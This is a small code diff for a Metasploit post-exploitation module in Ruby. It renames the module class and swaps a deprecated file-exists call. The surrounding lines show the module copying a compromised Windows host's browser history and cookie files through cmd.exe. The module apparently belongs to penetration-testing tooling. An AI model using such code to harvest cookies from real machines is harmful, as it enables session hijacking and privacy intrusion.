@@ -6,7 +6,7 @@
 require 'msf/core'
 require 'rex'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
 
   include Msf::Post::File
   include Msf::Post::Windows::Registry
@@ -271,7 +271,7 @@ class Metasploit3 < Msf::Post
     #Get history and cookies
     print_status("Retrieving history.....")
     h_paths.each do |hpath|
-      if session.fs.file.exists?(hpath)
+      if session.fs.file.exist?(hpath)
         print_line("\tFile: #{hpath}")
         #copy file
         cmd = "cmd.exe /c type \"#{hpath}\" > \"#{base}\\index.dat\""
@@ -291,7 +291,7 @@ class Metasploit3 < Msf::Post
 
     print_status("Retrieving cookies.....")
     c_paths.each do |cpath|
-      if session.fs.file.exists?(cpath)
+      if session.fs.file.exist?(cpath)
         print_line("\tFile: #{cpath}")
         #copy file
         cmd = "cmd.exe /c type \"#{cpath}\" > \"#{base}\\index.dat\""
